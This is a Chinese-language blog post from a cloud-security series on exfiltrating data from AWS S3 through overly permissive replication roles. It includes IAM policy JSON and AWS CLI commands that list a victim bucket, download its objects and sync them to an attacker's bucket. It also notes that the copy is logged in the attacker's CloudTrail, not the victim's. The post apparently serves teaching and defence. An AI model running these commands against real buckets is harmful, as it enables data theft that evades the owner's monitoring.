---
author: Sunny Tsai
title: "[Day 15] 天堂雲端 - Data Exfiltration on S3"
date: 2023-09-28
math: true
tags: [
    "cloud",
    "S3",
    "DLP"
]
categories: [
    "2023鐵人賽"
]
series: ["2023鐵人賽-天堂雲端之從開始到接管"]
---
# AWS S3 複寫策略(Replication Policies)
AWS S3 replication policy - [使用 Amazon S3 複寫在 AWS 區域內和區域間複寫資料](https://aws.amazon.com/tw/getting-started/hands-on/replicate-data-using-amazon-s3-replication/)。S3是一個高彈性、全受管、低成本的雲端服務，而複寫策略(Replication Policies)可以使得S3 bucket在**不同的bucket或是不同帳戶下的bucket**間複寫物件(object)。

注：如果兩個bucket要進行複寫，兩個bucket都要啟用版本控制。

# Misconfiguration
配置錯誤引發的資料外洩，以下是權限都打開的配置。

## Trust policy
在定義role的時候設定trust policy
![](https://imgur.com/Za1mztf.png)
```json
{
    "Version": "2012-10-17",
    "Statement": [
        {
            "Effect": "Allow",
            "Principal": {
                "Service": [
                    "s3.amazonaws.com",
                    "batchoperations.s3.amazonaws.com"   # 支援S3批次操作
                ]
            },
            "Action": "sts:AssumeRole"
        }
    ]
}
```

## AWS IAM roles
```json
{
    "Version": "2012-10-17",
    "Statement": [
        {
            "Effect": "Allow",
            "Action": [
                "s3:ListBucket",
                "s3:GetReplicationConfiguration",
                "s3:PutInventoryConfiguration",
                "s3:InitiateReplication"
            ],
            "Resource": "arn:aws:s3:::*"
        },
        {
            "Effect": "Allow",
            "Action": [
                "s3:GetObjectVersionForReplication",
                "s3:GetObjectVersionAcl",
                "s3:GetObjectVersionTagging"
            ],
            "Resource": "*"
        },
        {
            "Effect": "Allow",
            "Action": [
                "s3:ReplicateObject",
                "s3:ReplicateDelete",
                "s3:ReplicateTags"
            ],
            "Resource": "*"
        }
    ]
}
```


-----


# AWS Cli
模擬攻擊者複寫s3 bucket所有object方法

### list object - 確認有s3:ListBucket權限
```shell
% aws s3 ls {AWS_BUCKET_NAME}
```

### Get bucket ACL - 查看Object ACL權限
```
% aws s3api get-bucket-acl --bucket {AWS_BUCKET_NAME}
```

### Download Object To Local - 嘗試下載檔案
```
% aws s3 sync s3://{AWS_BUCKET_NAME} .
```

### Sync Object To another S3 bucket - 把s3 bucket所有資料都複寫到攻擊者創造或感染的s3 bucket
```
% aws s3 sync s3://{SOURCE_BUCKET} s3://{DESTINATION_BUCKET}
```

注：S3 GetObject調用會記錄在受害者的Cloudtrail數據事件中，但是S3 PutObject調用會記錄在攻擊者的Cloudtrail中，如此，受害者無法在AWS Cloudtrail中看到副本的S3複寫過程。
